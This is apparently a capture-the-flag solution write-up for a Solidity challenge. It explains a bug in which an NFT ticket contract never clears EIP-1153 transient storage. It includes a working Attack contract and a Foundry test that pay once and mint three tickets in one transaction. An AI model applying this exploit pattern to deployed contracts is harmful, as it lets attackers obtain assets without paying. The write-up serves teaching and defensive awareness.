# Transient Trouble Solution
Unlike normal storage, transient storage gets cleared at the end of a transaction. The upside of using transient storage is it costs the same price as using a warm storage slot (100 gas). Since transient storage is cheaper than using storage it is hypothesized it will be used for reentrancy guards. In this Dapp it is used to verify a user has paid the fee in the same transaction. Once that has been accomplished, a user is free to mint a ticket.

The issue with this smart contract is it does not clear transient storage after you purchase a ticket. If you checked the compiler warnings you would have seen the following warning:
```
Warning (2394): Transient storage as defined by EIP-1153 can break the composability of smart contracts: Since transient storage is cleared only at the end of the transaction and not at the end of the outermost call frame to the contract within a transaction, your contract may unintentionally misbehave when invoked multiple times in a complex transaction. To avoid this, be sure to clear all transient storage at the end of any call to your contract. The use of transient storage for reentrancy guards that are cleared at the end of the call is safe.
```

I specified you had to use `--isolate` because it makes each interaction in a test function a separate transaction. By default, all function calls inside a test function are grouped into one transaction. That would have made this challenge excessively easy as all you would have needed was to call `payAdmission()` then `receiveTicket()` multiple times in the test function. That would not encapsulate the issue with transient storage and composability. Luckily, the real solution was not much harder.

To beat this challenge, you simply had to create a separate smart contract to group all of the above mentioned steps into a single transaction. Here is the code for the hacker's smart contract:
```
contract Attack {

    NFT public ticket;
    ExclusiveClub daClub;

    constructor(NFT _ticket, ExclusiveClub _daClub) {
        ticket = _ticket;
        daClub = _daClub;
    }

    function attack() external payable {
        // set transient value
        daClub.payAdmission{value: msg.value}();
        // take advantage of the set transient value
        daClub.receiveTicket();
        daClub.receiveTicket();
        daClub.receiveTicket();
        // transfer NFTs to the hacker
        ticket.transferFrom(address(this), msg.sender, 0);
        ticket.transferFrom(address(this), msg.sender, 1);
        ticket.transferFrom(address(this), msg.sender, 2);
    }

}
```
Then we need our test function to look like so:
```
function test_GetThisPassing_8() public {

    address hacker = address(0xBAD);

    vm.startPrank(hacker);
    Attack attack = new Attack(ticket, daClub);
    attack.attack{value: 0.1 ether}();
    vm.stopPrank();

    assertGt(ticket.balanceOf(hacker), 2);
}
```

It is a fairly basic smart contract. All we need is our interactions with `ExclusiveClub.sol` to be grouped in a single transaction. In a way, it is similar to a read only reentrancy attack because it takes advantage of a state change from a previous function call.

Transient storage was introduced in the cancun hard fork, and is only available in solidity >= 0.8.24. As of creating this challenge, it has been less than a month since transient storage has been introduced. This is a new attack vector, and I urge developers to be aware of how transient storage affects your smart contracts composability!

Bonus Points if you discovered that users can lose ether by calling `payAdmission()` and `receiveTicket()` in separate transactions.
